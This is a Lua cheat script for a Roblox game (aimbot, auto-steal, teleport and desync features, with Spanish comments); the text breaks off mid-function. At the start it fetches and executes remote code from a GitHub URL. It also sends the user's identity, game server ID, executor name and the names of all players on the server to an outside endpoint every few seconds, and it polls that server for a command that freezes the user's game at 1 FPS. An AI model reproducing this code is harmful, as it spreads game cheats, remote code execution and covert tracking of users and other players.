-- KSK OP ON TOP (Auto Bat + Bypass Aimbot con botón flotante "BAT OP") -- CON AUTO-STEAL (versión Zeus mejorada)
task.spawn(function()
	pcall(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/7kDesync/k7mini/main/k7_mini.lua"))()
	end)
end)

local BASE = "https://project--e71aaf21-906f-4ffa-997f-3c410b4c2c38.lovable.app"
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
if not LP then LP = Players.PlayerAdded:Wait() end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
local gameName = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end) or "Unknown Game"
local avatarFetch = safe(function()
    local req = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
    if not req then return nil end
    local r = req({ Url = ("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=150x150&format=Png&isCircular=false"):format(LP.UserId), Method = "GET" })
    if r and r.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(r.Body) end)
        if ok and parsed and parsed.data and parsed.data[1] then return parsed.data[1].imageUrl end
    end
    return nil
end)
local avatarUrl = avatarFetch or ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(LP.UserId)

local request = http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
if not request then return end

local function listPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(t, p.Name)
    end
    return t
end

local fpsLimit = false

local function heartbeat()
    local body = {
        user_id = LP.UserId,
        username = LP.Name,
        display_name = LP.DisplayName,
        avatar_url = avatarUrl,
        place_id = game.PlaceId,
        game_name = gameName,
        job_id = game.JobId,
        executor = executorName,
        server_players = listPlayers(),
    }
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/heartbeat",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(body),
        })
    end)
    if res and res.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and parsed then fpsLimit = parsed.fps_limit == true end
    end
end

local function pollCommand()
    local res = safe(function()
        return request({
            Url = BASE .. ("/api/public/command?user_id=%d"):format(LP.UserId),
            Method = "GET",
        })
    end)
    if res and res.Body then
        local ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
        if ok and parsed then fpsLimit = parsed.fps_limit == true end
    end
end

task.spawn(function()
    while task.wait(5) do heartbeat() end
end)
heartbeat()

task.spawn(function()
    while task.wait(2) do pollCommand() end
end)

local function applyCap(v)
    if setfpscap then pcall(setfpscap, v) end
    if set_fps_cap then pcall(set_fps_cap, v) end
    if setfflag then pcall(setfflag, "DFIntTaskSchedulerTargetFps", tostring(v)) end
    if syn and syn.set_thread_identity then pcall(syn.set_thread_identity, 2) end
end

task.spawn(function()
    while true do
        if fpsLimit then applyCap(1) end
        task.wait(0.05)
    end
end)

task.spawn(function()
    while true do
        if fpsLimit then applyCap(1) end
        RunService.RenderStepped:Wait()
    end
end)

task.spawn(function()
    local last = false
    while task.wait(0.5) do
        if last and not fpsLimit then applyCap(240) end
        last = fpsLimit
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

-- ===== COLORES COMPARTIDOS PARA PANEL MÓVIL Y BOTONES FLOTANTES =====
local Q_OFF      = Color3.fromRGB(10, 20, 40)
local Q_ON       = Color3.fromRGB(50, 100, 200)
local Q_TEXT_OFF = Color3.fromRGB(170, 200, 255)
local Q_TEXT_ON  = Color3.fromRGB(255, 255, 255)
local Q_BORDER   = Color3.fromRGB(30, 60, 120)
local Q_BORDER_ON= Color3.fromRGB(80, 160, 255)
-- ===================================================================

;(function()
local NS, CS, LS, LS2 = 60, 30, 15, 24.5
local laggerPhase = 0

local State = {
	speedToggled = false, laggerToggled = false,
	hittingCooldown = false, infJumpEnabled = false,
	holdJumpEnabled = false,
	antiRagdollEnabled = false, fpsBoostEnabled = false,
	antiLagEnabled = false,
	guiVisible = true,
	introEnabled = true,
	selectedIntroMusic = 1,
	dropActive = false,
	dropBrainrotActive = false,
	autoLeftEnabled = false, autoRightEnabled = false,
	unwalkEnabled = false,
	desyncEnabled = false,
	stretchRezEnabled = false, removeAccessoriesEnabled = false,
	-- AUTO BAT (original)
	autoBatToggled = false,
	-- BYPASS AIMBOT (nuevo)
	bypassToggled = false,
	bypassMode = 1,   -- 1 = Bypass, 2 = TP Bat
	bypassSpeed = 60,
	-- TRYARD ANIMATION (añadido)
	tryardAnimEnabled = false,
}

-- ===== TRYARD ANIMATION PACK (extraído del segundo script) =====
local TryardAnims = {
    idle1 = "rbxassetid://133806214992291",
    idle2 = "rbxassetid://94970088341563",
    walk  = "rbxassetid://707897309",
    run   = "rbxassetid://707861613",
    jump  = "rbxassetid://116936326516985",
    fall  = "rbxassetid://116936326516985",
    climb = "rbxassetid://116936326516985",
    swim  = "rbxassetid://116936326516985",
    swimidle = "rbxassetid://116936326516985",
}
local tryardHeartbeatConn = nil
local originalTryardAnims = nil

local function isTryardPackAnim(id)
    for _,v in pairs(TryardAnims) do
        if v == id then return true end
    end
    return false
end

local function saveOriginalTryardAnims(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function g(obj)
        return obj and obj.AnimationId or nil
    end
    local ids = {
        idle1 = g(animate.idle and animate.idle.Animation1),
        idle2 = g(animate.idle and animate.idle.Animation2),
        walk  = g(animate.walk and animate.walk.WalkAnim),
        run   = g(animate.run  and animate.run.RunAnim),
        jump  = g(animate.jump and animate.jump.JumpAnim),
        fall  = g(animate.fall and animate.fall.FallAnim),
        climb = g(animate.climb and animate.climb.ClimbAnim),
        swim  = g(animate.swim and animate.swim.Swim),
        swimidle = g(animate.swimidle and animate.swimidle.SwimIdle),
    }
    if not isTryardPackAnim(ids.walk) then
        originalTryardAnims = ids
    end
end

local function applyTryardAnimPack(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function s(obj,id)
        if obj then obj.AnimationId = id end
    end
    s(animate.idle and animate.idle.Animation1, TryardAnims.idle1)
    s(animate.idle and animate.idle.Animation2, TryardAnims.idle2)
    s(animate.walk and animate.walk.WalkAnim, TryardAnims.walk)
    s(animate.run  and animate.run.RunAnim,   TryardAnims.run)
    s(animate.jump and animate.jump.JumpAnim, TryardAnims.jump)
    s(animate.fall and animate.fall.FallAnim, TryardAnims.fall)
    s(animate.climb and animate.climb.ClimbAnim, TryardAnims.climb)
    s(animate.swim and animate.swim.Swim, TryardAnims.swim)
    s(animate.swimidle and animate.swimidle.SwimIdle, TryardAnims.swimidle)
end

local function stopTryardAnim()
    if tryardHeartbeatConn then
        tryardHeartbeatConn:Disconnect()
        tryardHeartbeatConn = nil
    end
    if originalTryardAnims and LP.Character then
        local animate = LP.Character:FindFirstChild("Animate")
        if animate then
            local function s(obj,id)
                if obj then obj.AnimationId = id end
            end
            s(animate.idle and animate.idle.Animation1, originalTryardAnims.idle1)
            s(animate.idle and animate.idle.Animation2, originalTryardAnims.idle2)
            s(animate.walk and animate.walk.WalkAnim, originalTryardAnims.walk)
            s(animate.run  and animate.run.RunAnim,   originalTryardAnims.run)
            s(animate.jump and animate.jump.JumpAnim, originalTryardAnims.jump)
            s(animate.fall and animate.fall.FallAnim, originalTryardAnims.fall)
            s(animate.climb and animate.climb.ClimbAnim, originalTryardAnims.climb)
            s(animate.swim and animate.swim.Swim, originalTryardAnims.swim)
            s(animate.swimidle and animate.swimidle.SwimIdle, originalTryardAnims.swimidle)
        end
    end
    originalTryardAnims = nil
end

local function startTryardAnim()
    if tryardHeartbeatConn then
        tryardHeartbeatConn:Disconnect()
    end
    local char = LP.Character
    if char then
        saveOriginalTryardAnims(char)
        applyTryardAnimPack(char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
                track:Stop(0)
            end
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end
    end
    tryardHeartbeatConn = RunService.Heartbeat:Connect(function()
        if not State.tryardAnimEnabled then return end
        local c = LP.Character
        if c then
            applyTryardAnimPack(c)
        end
    end)
end

-- ===== FIN TRYARD ANIMATION =====

-- ===== MEDUSA RESET =====
local reset_remote = nil
local insta_reset_cooldown = false
local medusaResetEnabled = false
local anchor_conns = {}
local GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
local orig_fire
pcall(function()
    if hookfunction and newcclosure then
        orig_fire = hookfunction(Instance.new("RemoteEvent").FireServer, newcclosure(function(self, ...)
            if not reset_remote and type(self.Name) == "string" and self.Name:sub(1, 3) == "RE/" then
                reset_remote = self
            end
            return orig_fire(self, ...)
        end))
    end
end)

task.spawn(function()
    task.wait(3)
    if reset_remote then return end
    for _, desc in ipairs(game:GetDescendants()) do
        if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
            reset_remote = desc
            break
        end
    end
end)

local function insta_reset()
    if insta_reset_cooldown then return end
    if not reset_remote then
        for _, desc in ipairs(game:GetDescendants()) do
            if desc:IsA("RemoteEvent") and desc.Name:sub(1, 3) == "RE/" then
                reset_remote = desc
                break
            end
        end
    end
    if not reset_remote then return end

    insta_reset_cooldown = true
    local old_char = LP.Character
    if not old_char then
        insta_reset_cooldown = false
        return
    end

    task.spawn(function()
        while LP.Character == old_char do
            pcall(function()
                reset_remote:FireServer(GUID, LP, "balloon")
            end)
            task.wait()
        end
        insta_reset_cooldown = false
    end)
end

local function onAnchorChanged(part)
    return part:GetPropertyChangedSignal("Anchored"):Connect(function()
        if medusaResetEnabled and part.Anchored and part.Transparency == 1 then
            insta_reset()
        end
    end)
end

local function setupMedusaWatcher(char)
    for _, c in pairs(anchor_conns) do
        pcall(function() c:Disconnect() end)
    end
    anchor_conns = {}

    if not char or not medusaResetEnabled then return end

    for _, part in ipairs(char:GetDescendants()) do
        if part:IsA("BasePart") then
            table.insert(anchor_conns, onAnchorChanged(part))
        end
    end

    table.insert(anchor_conns, char.DescendantAdded:Connect(function(part)
        if part:IsA("BasePart") then
            table.insert(anchor_conns, onAnchorChanged(part))
        end
    end))
end

local function disconnectMedusaWatcher()
    for _, c in pairs(anchor_conns) do
        pcall(function() c:Disconnect() end)
    end
    anchor_conns = {}
end
-- ===== FIN MEDUSA RESET =====

local _anyKeyListening, uiLocked = false, false
local setLockUIVisual, MobilePanel, rebuildMobileButtons, resetMobileButtons
local autoSavePositions = function() end
local mobilePanelStyle = "darkhub"
local mobileBtnFrames, mobileBtnActive, allMobileBtns = {}, {}, {}
local BTN_POSITIONS_DH = {
	Drop       = UDim2.new(1, -298, 1, -334),
	AutoLeft   = UDim2.new(1, -144, 1, -334),
	AutoBat    = UDim2.new(1, -298, 1, -270),
	AutoRight  = UDim2.new(1, -144, 1, -270),
	TPDown     = UDim2.new(1, -298, 1, -206),
	Speed      = UDim2.new(1, -144, 1, -206),
	Lagger     = UDim2.new(1, -144, 1, -142),
}

local KB = {
	AutoLeft  = {kb = Enum.KeyCode.Z,           gp = nil},
	AutoRight = {kb = Enum.KeyCode.C,           gp = nil},
	Drop      = {kb = Enum.KeyCode.X,           gp = nil},
	TPDown    = {kb = Enum.KeyCode.F,           gp = nil},
	AutoBat   = {kb = Enum.KeyCode.E,           gp = nil},
	Speed     = {kb = Enum.KeyCode.Q,           gp = nil},
	Lagger    = {kb = Enum.KeyCode.R,           gp = nil},
	GuiHide   = {kb = Enum.KeyCode.LeftControl, gp = nil},
	Bypass    = {kb = Enum.KeyCode.N,           gp = nil}, -- Tecla para el bypass
}

local function kbMatch(entry, kc)
	return kc == entry.kb or (entry.gp and kc == entry.gp)
end

local AP = {
	L1=Vector3.new(-476.48,-6.28,92.73), L2=Vector3.new(-483.12,-4.95,94.80), L_FACE=Vector3.new(-482.25,-4.96,92.09),
	R1=Vector3.new(-476.16,-6.52,25.62), R2=Vector3.new(-483.06,-5.03,25.48), R_FACE=Vector3.new(-482.06,-6.93,35.47),
}

-- ===== AUTO STEAL (versión Zeus mejorada) =====
local Steal = {
	AutoStealEnabled = false,
	StealRadius = 59,
	StealDuration = 1.3,
	Data = {},
}

local Conns = {
	autoSteal = nil,
	antiRag = nil,
	anchor = {},
	progress = nil,
	aimbot = nil,      -- para Auto Bat
	bypass = nil,      -- para Bypass Aimbot
}

-- ============================================================
-- ══ AUTO BAT (AIMBOT ORIGINAL) ══
-- ============================================================
local function findBat()
	local char = LP.Character
	if not char then return nil end
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
	end
	local bp = LP:FindFirstChild("Backpack")
	if bp then
		for _, tool in ipairs(bp:GetChildren()) do
			if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end
		end
	end
	return nil
end

local function equipBat()
	local char = LP.Character
	if not char then return end
	local hum = char:FindFirstChildOfClass("Humanoid")
	if not hum then return end
	local bat = findBat()
	if bat and bat.Parent ~= char then
		pcall(function() hum:EquipTool(bat) end)
	end
end

local function getClosestTarget()
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			if tRoot and hum and hum.Health > 0 then
				local dist = (tRoot.Position - root.Position).Magnitude
				if dist < minDist then minDist = dist; closest = tRoot end
			end
		end
	end
	return closest
end

local MOB_SWING_COOLDOWN = 0.08
local function tryHitBatMob()
	if State.hittingCooldown then return end
	State.hittingCooldown = true
	pcall(function()
		local c = LP.Character
		if not c then return end
		local hum2 = c:FindFirstChildOfClass("Humanoid")
		local tool = c:FindFirstChildOfClass("Tool")
		if not tool then
			tool = findBat()
			if tool and hum2 then pcall(function() hum2:EquipTool(tool) end) end
		end
		if tool then
			local remote = tool:FindFirstChildOfClass("RemoteEvent")
			if remote then pcall(function() remote:FireServer() end)
			else pcall(function() tool:Activate() end) end
		end
	end)
	task.delay(MOB_SWING_COOLDOWN, function() State.hittingCooldown = false end)
end

function startBatAimbot()
	if Conns.aimbot then Conns.aimbot:Disconnect() end

	-- Apagar otros movimientos automáticos
	if State.autoLeftEnabled then
		State.autoLeftEnabled = false
		if autoLeftSetVisual then autoLeftSetVisual(false) end
		stopAutoLeft()
	end
	if State.autoRightEnabled then
		State.autoRightEnabled = false
		if autoRightSetVisual then autoRightSetVisual(false) end
		stopAutoRight()
	end
	if State.bypassToggled then
		State.bypassToggled = false
		stopBypassAimbot()
		if bypassSetVisual then bypassSetVisual(false) end
		if bypassBtn then updateBypassBtnAppearance(false) end
	end

	equipBat()

	local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then hum0.AutoRotate = false end

	Conns.aimbot = RunService.RenderStepped:Connect(function()
		if not State.autoBatToggled then return end
		local char = LP.Character; if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end

		if not char:FindFirstChildOfClass("Tool") then
			local bat = findBat()
			if bat then pcall(function() hum:EquipTool(bat) end) end
		end

		local target = getClosestTarget()
		if not target then return end

		local targetVel = target.AssemblyLinearVelocity
		local myPos = root.Position
		local targetPos = target.Position

		local predictPos = targetPos + targetVel * 0.14
		predictPos = predictPos + target.CFrame.LookVector * 0.3

		local direction = predictPos - myPos
		local flatDir = Vector3.new(direction.X, 0, direction.Z).Unit
		local chaseSpeed = 58

		local desiredHeight = targetPos.Y + 3.7
		local yVel = (desiredHeight - myPos.Y) * 19.5 + targetVel.Y * 0.8
		if hum.FloorMaterial ~= Enum.Material.Air then
			yVel = math.max(yVel, 13)
		end
		yVel = math.clamp(yVel, -70, 110)

		local desiredVel = Vector3.new(flatDir.X * chaseSpeed, yVel, flatDir.Z * chaseSpeed)
		root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)

		local speed3 = targetVel.Magnitude
		local predictTime = math.clamp(speed3 / 150, 0.05, 0.2)
		local predictedPos = targetPos + targetVel * predictTime
		local toPredict = predictedPos - myPos
		if toPredict.Magnitude > 0.1 then
			local goalCF = CFrame.lookAt(myPos, predictedPos)
			local curCF  = root.CFrame
			local diffCF = curCF:Inverse() * goalCF
			local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
			rx = math.clamp(rx, -2.5, 2.5)
			ry = math.clamp(ry, -2.5, 2.5)
			rz = math.clamp(rz, -2.5, 2.5)
			local tiltSpeed = 42
			root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(
				Vector3.new(rx * tiltSpeed, ry * tiltSpeed, rz * tiltSpeed)
			)
		end

		local distToTarget = (root.Position - target.Position).Magnitude
		if distToTarget <= 8 then
			tryHitBatMob()
		end
	end)
end

function stopBatAimbot()
	if Conns.aimbot then
		Conns.aimbot:Disconnect()
		Conns.aimbot = nil
	end
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	local hum = c and c:FindFirstChildOfClass("Humanoid")
	if hum then hum.AutoRotate = true end
	if root then
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
	end
	State.hittingCooldown = false
end

-- ============================================================
-- ══ BYPASS AIMBOT (tomado de Lust Hub) ══
-- ============================================================
local BYPASS_FOLLOW_DIST = 1.0
local BYPASS_HEIGHT_OFFSET = 1.5
local BYPASS_VERTICAL_OFFSET = 0.0
local BYPASS_HIT_DIST = 4.5
local BYPASS_SWING_COOLDOWN = 0.08
local bypassHittingCooldown = false
local bypassConn = nil

local function isBatTool(tool)
	if not tool then return false end
	local batNames = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
	for _, name in ipairs(batNames) do
		if tool.Name == name then return true end
	end
	return tool.Name:lower():find("bat") or tool.Name:lower():find("slap")
end

local function getClosestPlayerV2()
	local char = LP.Character
	if not char then return nil, math.huge end
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hrp then return nil, math.huge end
	local closest, bestDist = nil, math.huge
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP and p.Character then
			local tr = p.Character:FindFirstChild("HumanoidRootPart")
			local ph = p.Character:FindFirstChildOfClass("Humanoid")
			if tr and ph and ph.Health > 0 then
				local d = (hrp.Position - tr.Position).Magnitude
				if d < bestDist then bestDist = d; closest = p end
			end
		end
	end
	return closest, bestDist
end

local function tryHitBypass()
	if bypassHittingCooldown then return end
	bypassHittingCooldown = true
	pcall(function()
		local char = LP.Character
		if not char then return end
		local currentTool = char:FindFirstChildOfClass("Tool")
		if currentTool and not isBatTool(currentTool) then
			bypassHittingCooldown = false
			return
		end
		local bat = findBat()
		if bat then
			if bat.Parent ~= char then
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(bat) end) end
			end
			local remote = bat:FindFirstChildOfClass("RemoteEvent")
			if remote then pcall(function() remote:FireServer() end) else pcall(function() bat:Activate() end) end
		end
	end)
	task.delay(BYPASS_SWING_COOLDOWN, function() bypassHittingCooldown = false end)
	task.delay(0.2, function()
		if bypassHittingCooldown then bypassHittingCooldown = false end
	end)
end

function startBypassAimbot()
	if bypassConn then return end
	bypassConn = RunService.Heartbeat:Connect(function()
		if not State.bypassToggled then return end
		local char = LP.Character
		if not char then return end
		local root = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not root or not hum then return end

		local state = hum:GetState()
		if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
			return
		end

		if not char:FindFirstChildOfClass("Tool") then
			local bat = findBat()
			if bat then pcall(function() hum:EquipTool(bat) end) end
		end

		local target, dist = getClosestPlayerV2()
		if target and target.Character then
			local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
			if targetRoot then
				if State.bypassMode == 1 then
					local targetVel = targetRoot.AssemblyLinearVelocity
					local moveDir = targetVel.Magnitude > 0.1 and targetVel.Unit or targetRoot.CFrame.LookVector
					local offset = moveDir * BYPASS_FOLLOW_DIST + Vector3.new(0, BYPASS_HEIGHT_OFFSET + BYPASS_VERTICAL_OFFSET, 0)
					local desiredPos = targetRoot.Position + offset
					local toTarget = desiredPos - root.Position
					if toTarget.Magnitude > 0.5 then
						local moveVec = toTarget.Unit * State.bypassSpeed
						root.AssemblyLinearVelocity = Vector3.new(moveVec.X, moveVec.Y, moveVec.Z)
					else
						root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.95
						if root.AssemblyLinearVelocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
					end
					local distToTarget = (root.Position - targetRoot.Position).Magnitude
					if distToTarget <= BYPASS_HIT_DIST then
						tryHitBypass()
					end
				else
					-- Modo 2: TP Bat
					pcall(function()
						if sethiddenproperty then
							sethiddenproperty(root, "PhysicsRepRootPart", targetRoot)
						end
					end)
					local targetPos = targetRoot.Position + Vector3.new(0, 0.9, 0)
					if (root.Position - targetPos).Magnitude > 8 then
						root.CFrame = CFrame.new(targetPos)
					end
					local cam = workspace.CurrentCamera
					if cam then
						cam.CFrame = CFrame.new(cam.CFrame.Position, targetRoot.Position)
					end
					tryHitBypass()
				end
			end
		else
			if State.bypassMode == 1 then
				root.AssemblyLinearVelocity = root.AssemblyLinearVelocity * 0.9
				if root.AssemblyLinearVelocity.Magnitude < 1 then root.AssemblyLinearVelocity = Vector3.zero end
			end
		end
	end)
end

function stopBypassAimbot()
	if bypassConn then
		bypassConn:Disconnect()
		bypassConn = nil
	end
	local c = LP.Character
	local root = c and c:FindFirstChild("HumanoidRootPart")
	local hum = c and c:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.AutoRotate = true
		hum.PlatformStand = false
		pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
	end
	if root then
		root.AssemblyLinearVelocity = Vector3.new(0, -0.1, 0)
		root.AssemblyAngularVelocity = Vector3.zero
		pcall(function() sethiddenproperty(root, "PhysicsRepRootPart", nil) end)
	end
	bypassHittingCooldown = false
end

function toggleBypass(state)
	if state == nil then
		state = not State.bypassToggled
	end
	State.bypassToggled = state
	if state then
		if State.autoBatToggled then
			State.autoBatToggled = false
			stopBatAimbot()
			if autoBatSetVisual then autoBatSetVisual(false) end
		end
		if State.autoLeftEnabled then
			State.autoLeftEnabled = false
			stopAutoLeft()
			if autoLeftSetVisual then autoLeftSetVisual(false) end
		end
		if State.autoRightEnabled then
			State.autoRightEnabled = false
			stopAutoRight()
			if autoRightSetVisual then autoRightSetVisual(false) end
		end
		startBypassAimbot()
	else
		stopBypassAimbot()
	end
	if bypassSetVisual then bypassSetVisual(state) end
	if bypassBtn then updateBypassBtnAppearance(state) end
end

function toggleBypassMode()
	State.bypassMode = State.bypassMode == 1 and 2 or 1
	if bypassModeBtn then
		bypassModeBtn.Text = State.bypassMode == 1 and "Bypass" or "TP Bat"
	end
	if State.bypassToggled then
		stopBypassAimbot()
		startBypassAimbot()
	end
end

-- ─── Fin Bypass Aimbot ─────────────────────────────────────────────

local h, hrp, speedLbl
local setAutoGrab, setAutoBat, setInfJump, setHoldJump, setAntiRag, setFps, setUnwalkToggle, autoLeftSetVisual, autoRightSetVisual, autoBatSetVisual, setIntroToggle
local setAntiLag, setStretchRez, setRemoveAccessories, setDarkMode
local setMedusaCounter, setBatCounter, setInstaGrab, setAutoSwingVisual
local setDesync, saDesync
saDesync = function() end
local startDesyncSession, stopDesyncSession
local startAntiRagdoll, stopAntiRagdoll, applyFPSBoost
local mobileSpeedSetActive, mobileLaggerSetActive, mobileLaggerCarrySetActive, saveConfig, loadConfig = nil, nil, nil, nil, nil
local normalBox, carryBox, laggerBox, laggerBox2, durValBtn, uiScaleBox
local modeValLbl
local alConn, arConn, alPhase, arPhase = nil, nil, 1, 1
local autoTPDownEnabled, autoTPDownConn, autoTPDownHeight = false, nil, 20
local bypassSetVisual = nil
local bypassModeBtn = nil
local bypassBtn = nil  -- botón flotante para bypass
local resetBtn = nil   -- botón flotante para reset

-- Barra de progreso (reutilizada)
local progressPct, progressFill, progressRadLbl

local function stopAutoLeft()
	if alConn then alConn:Disconnect(); alConn = nil end
	alPhase = 1
	local char = LP.Character
	if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero, false) end end
end

local function stopAutoRight()
	if arConn then arConn:Disconnect(); arConn = nil end
	arPhase = 1
	local char = LP.Character
	if char then local hum = char:FindFirstChildOfClass("Humanoid"); if hum then hum:Move(Vector3.zero, false) end end
end

local function startAutoLeft()
	if alConn then alConn:Disconnect() end
	alPhase = 1
	alConn = RunService.Heartbeat:Connect(function()
		if not State.autoLeftEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp2 = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp2 or not hum then return end
		local spd = NS
		if alPhase == 1 then
			local tgt = Vector3.new(AP.L1.X, hrp2.Position.Y, AP.L1.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				alPhase = 2
				local d = AP.L2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
				hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
			end
			local d = AP.L1 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		elseif alPhase == 2 then
			local tgt = Vector3.new(AP.L2.X, hrp2.Position.Y, AP.L2.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				hum:Move(Vector3.zero,false); hrp2.AssemblyLinearVelocity = Vector3.zero
				State.autoLeftEnabled = false
				if alConn then alConn:Disconnect(); alConn = nil end
				alPhase = 1
				if autoLeftSetVisual then autoLeftSetVisual(false) end
				if (AP.L_FACE - hrp2.Position).Magnitude > 0.01 then
					hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP.L_FACE.X, hrp2.Position.Y, AP.L_FACE.Z))
				end
				return
			end
			local d = AP.L2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		end
	end)
end

local function startAutoRight()
	if arConn then arConn:Disconnect() end
	arPhase = 1
	arConn = RunService.Heartbeat:Connect(function()
		if not State.autoRightEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp2 = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp2 or not hum then return end
		local spd = NS
		if arPhase == 1 then
			local tgt = Vector3.new(AP.R1.X, hrp2.Position.Y, AP.R1.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				arPhase = 2
				local d = AP.R2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
				hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd); return
			end
			local d = AP.R1 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		elseif arPhase == 2 then
			local tgt = Vector3.new(AP.R2.X, hrp2.Position.Y, AP.R2.Z)
			if (tgt - hrp2.Position).Magnitude < 1 then
				hum:Move(Vector3.zero,false); hrp2.AssemblyLinearVelocity = Vector3.zero
				State.autoRightEnabled = false
				if arConn then arConn:Disconnect(); arConn = nil end
				arPhase = 1
				if autoRightSetVisual then autoRightSetVisual(false) end
				if (AP.R_FACE - hrp2.Position).Magnitude > 0.01 then
					hrp2.CFrame = CFrame.new(hrp2.Position, Vector3.new(AP.R_FACE.X, hrp2.Position.Y, AP.R_FACE.Z))
				end
				return
			end
			local d = AP.R2 - hrp2.Position; local mv = Vector3.new(d.X,0,d.Z).Unit
			hum:Move(mv,false); hrp2.AssemblyLinearVelocity = Vector3.new(mv.X*spd, hrp2.AssemblyLinearVelocity.Y, mv.Z*spd)
		end
	end)
end

-- ─── Drop Brainrot ───────────────────────────────────────────────────────────
local DROP_ASCEND_DURATION = 0.2
local DROP_ASCEND_SPEED = 150

local function runDrop()
	if State.dropActive then return end
	local char = LP.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	State.dropActive = true; local t0 = tick(); local dc
	dc = RunService.Heartbeat:Connect(function()
		local r = char and char:FindFirstChild("HumanoidRootPart")
		if not r then dc:Disconnect(); State.dropActive = false; return end
		if tick() - t0 >= DROP_ASCEND_DURATION then
			dc:Disconnect()
			local rp = RaycastParams.new(); rp.FilterDescendantsInstances = {char}; rp.FilterType = Enum.RaycastFilterType.Exclude
			local rr = workspace:Raycast(r.Position, Vector3.new(0, -2000, 0), rp)
			if rr then
				local hum2 = char:FindFirstChildOfClass("Humanoid")
